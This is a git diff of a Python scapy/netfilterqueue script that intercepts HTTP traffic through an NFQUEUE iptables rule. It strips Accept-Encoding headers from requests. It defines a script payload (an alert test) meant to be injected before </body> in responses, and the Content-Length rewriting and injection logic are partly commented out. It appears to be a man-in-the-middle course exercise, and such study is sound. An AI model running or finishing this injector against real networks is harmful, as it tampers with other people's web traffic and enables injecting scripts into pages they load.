@@ -12,10 +12,8 @@ import re
 #once you are done, flush the iptables: iptables --flush
 
 #set the iptables as follow to test on local machine test on local machine
-#iptables -i output -j nfqueue --queue-num 0
-#iptables -i input -j nfqueue --queue-num 0
-
-ack_list = []
+#iptables -I INPUT -j NFQUEUE --queue-num 0
+#iptables -I OUTPUT -j NFQUEUE --queue-num 0
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -26,36 +24,57 @@ def set_load(packet, load):
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(http.HTTPRequest) or scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet.haslayer(scapy.Raw):
-            load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Request")
-            #print(scapy_packet[http.HTTPRequest].Headers)
-            headers = re.sub("Accept-Encoding.*?\\r\\n","", scapy_packet[http.HTTPRequest].Headers)
-          #  print("[+] New header")
-          #  print(headers)
-           # print("[+] New scapy packet")
-            scapy_packet[http.HTTPRequest].Headers = headers
-           # print("Debug1")
-            del scapy_packet[scapy.IP].len
-           # print("Debug2")
-            del scapy_packet[scapy.IP].chksum
-           # print("Debug3")
-            del scapy_packet[scapy.TCP].chksum
-           # print("Debug4")
-            packet.set_payload(str(scapy_packet)) 
+    if scapy_packet.haslayer(http.HTTPRequest) \
+            and scapy_packet[scapy.TCP].dport == 80: 
+
+        print("[+] Request")
+        headers = re.sub("Accept-Encoding.*?\\r\\n","", scapy_packet[http.HTTPRequest].Headers)
+        scapy_packet[http.HTTPRequest].Headers = headers
+        scapy_packet.show()
+
+        del scapy_packet[scapy.IP].len
+        del scapy_packet[scapy.IP].chksum
+        del scapy_packet[scapy.TCP].chksum
+        packet.set_payload(str(scapy_packet)) 
 
 
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] Response!")
-            print(scapy_packet.show())
-            #load = load.replace("</body>","<script>alert('test')</script></body>")
 
+    if scapy_packet.haslayer(http.HTTPResponse) \
+            and scapy_packet[scapy.TCP].sport == 80 \
+            and scapy_packet.haslayer(scapy.Raw): 
 
-        #if load != scapy_packet[scapy.Raw].load:
-        #    new_packet = set_load(scapy_packet, load)
-        #    packet.set_payload(str(new_packet)) 
+        scapy_packet.show()
+        print("[+] Response!")
+        injection_code = "<script>alert('test')</script>"
+        headers = ""
+        load = ""
+
+#        #Modifying the content length of the load
+#        if scapy_packet[http.HTTPResponse].Headers:
+#            headers = scapy_packet[http.HTTPResponse].Headers 
+#            content_length_search = re.search("(?:Content-Length:\s)(\d*)",headers)
+#            if content_length_search:
+#                content_length = content_length_search.group(1)
+#                new_content_length = int(content_length) + len(injection_code)
+#                headers = headers.replace(content_length, str(new_content_length))
+
+#        load = scapy_packet[scapy.Raw].load
+#        load = load.replace("</body>",injection_code + "</body>")
+
+#        if headers != ""  and headers != scapy_packet[http.HTTPResponse].Headers:
+#            scapy_packet[http.HTTPResponse].Headers = headers
+#            del scapy_packet[scapy.IP].len
+#            del scapy_packet[scapy.IP].chksum
+#            del scapy_packet[scapy.TCP].chksum
+#
+#
+#        if load != scapy_packet[scapy.Raw].load:
+#           print("[!] Load is being modified!")
+#           #print(scapy_packet[http.HTTPResponse].load)
+#           #print(load)
+#           new_packet = set_load(scapy_packet, load)
+#           packet.set_payload(str(new_packet)) 
+#
 
     packet.accept()
 
